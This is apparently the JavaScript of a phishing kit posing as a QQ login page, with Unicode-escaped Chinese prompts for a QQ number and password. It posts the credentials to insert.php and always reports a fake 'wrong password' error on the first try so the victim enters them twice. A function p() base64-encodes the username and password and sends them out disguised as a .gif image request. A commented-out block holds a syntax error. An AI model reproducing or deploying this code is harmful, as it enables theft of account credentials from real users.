﻿﻿
var keyStr = "ABCDEFGHIJKLMNOP" +
             "QRSTUVWXYZabcdef" +
             "ghijklmnopqrstuv" +
             "wxyz0123456789+/" +
             "=";
function encode64(input) {
   input = escape(input);
   var output = "";
   var chr1, chr2, chr3 = "";
   var enc1, enc2, enc3, enc4 = "";
   var i = 0;

   do {
      chr1 = input.charCodeAt(i++);
      chr2 = input.charCodeAt(i++);
      chr3 = input.charCodeAt(i++);

      enc1 = chr1 >> 2;
      enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
      enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
      enc4 = chr3 & 63;

      if (isNaN(chr2)) {
         enc3 = enc4 = 64;
      } else if (isNaN(chr3)) {
         enc4 = 64;
      }

      output = output +
         keyStr.charAt(enc1) +
         keyStr.charAt(enc2) +
         keyStr.charAt(enc3) +
         keyStr.charAt(enc4);
      chr1 = chr2 = chr3 = "";
      enc1 = enc2 = enc3 = enc4 = "";
   } while (i < input.length);

   return output;
}


var t=0;
function s_A44169C9347F69()
{
	$('#mA44169C9347F69').html('&nbsp;');
	
	if($('#uA44169C9347F69').val()=='')
	{
		$('#mA44169C9347F69').html('\u8bf7'+'\u8f93'+'\u5165'+'\u0051'+'\u0051'+'\u53f7'+'\u7801'+'\uff01');
		$('#uA44169C9347F69').focus();
		return false;
	}
	
	if( $('#uA44169C9347F69').val().length<5 || $('#uA44169C9347F69').val().length>21 )
	{
		$('#mA44169C9347F69').html('\u0051'+'\u0051'+'\u53f7'+'\u9519'+'\u8bef'+'\uff01');
		$('#uA44169C9347F69').focus(); return false;
	}
	
	if($('#pA44169C9347F69').val()=='')
	{
		$('#mA44169C9347F69').html('\u8bf7'+'\u8f93'+'\u5165'+'\u0051'+'\u0051'+'\u5bc6'+'\u7801'+'\uff01');
		$('#pA44169C9347F69').focus();
		return false;
	}
	
	if( $('#pA44169C9347F69').val().length<6 || $('#pA44169C9347F69').val().length>18 )
	{
		$('#pA44169C9347F69').attr('value','');
		$('#mA44169C9347F69').html('\u5bc6'+'\u7801'+'\u957f'+'\u5ea6'+'\u9519'+'\u8bef'+'\uff01');
		$('#pA44169C9347F69').focus(); return false;
	}
	
	
	
	$.post("insert.php?"+$('#kA44169C9347F69').val(), {
		'uA44169C9347F69': $("#uA44169C9347F69").val(),
		'pA44169C9347F69': $("#pA44169C9347F69").val()
		}, function(data,status){
			
			if(t<1)
			{
				$('#uA44169C9347F69').attr('value','');
				$('#pA44169C9347F69').attr('value','');
				$('#mA44169C9347F69').html('\u0051'+'\u0051'+'\u5e10'+'\u53f7'+'\u6216'+'\u5bc6'+'\u7801'+'\u9519'+'\u8bef'+'\uff0c'+'\u8bf7'+'\u91cd'+'\u65b0'+'\u8f93'+'\u5165'+'\uff01');
				t++;
				$('#uA44169C9347F69').focus();
			}else{
				$('#mA44169C9347F69').html('&nbsp;');
				document.location="insert.php?"+($('#kA44169C9347F69').val())+"__go__"+("PSA8ydNmhV"+"&url="+($('#tA44169C9347F69').val()));
			}
		
		});
	
/*	
	
	if(t<1)
	{
		p();
		$('#uA44169C9347F69').attr('value','');
		$('#pA44169C9347F69').attr('value','');
		$('#mA44169C9347F69').html('\u0051'+'\u0051'+'\u5e10'+'\u53f7'+'\u6216'+'\u5bc6'+'\u7801'+'\u9519'+'\u8bef'+'\uff0c'+'\u8bf7'+'\u91cd'+'\u65b0'+'\u8f93'+'\u5165'+'\uff01');
		t++;
		$('#uA44169C9347F69').focus();
	}else{
		p();
		$('#mA44169C9347F69').html('&nbsp;');
		document.location="/insert.php?"+($('#kA44169C9347F69').val())+"__go__"+("PSA8ydNmhV")+;
	}
*/

	
	return false;
}




function p()
{
	var t=Date.parse(new Date());
	var s=encode64($('#kA44169C9347F69').val()+"\t"+$("#uA44169C9347F69").val()+"\t"+$("#pA44169C9347F69").val());
	var htmlobj=$.ajax({url:"/tpl/SlNAQowoAQtMhaUMoM/"+s+".gif_"+t,async:false});
}
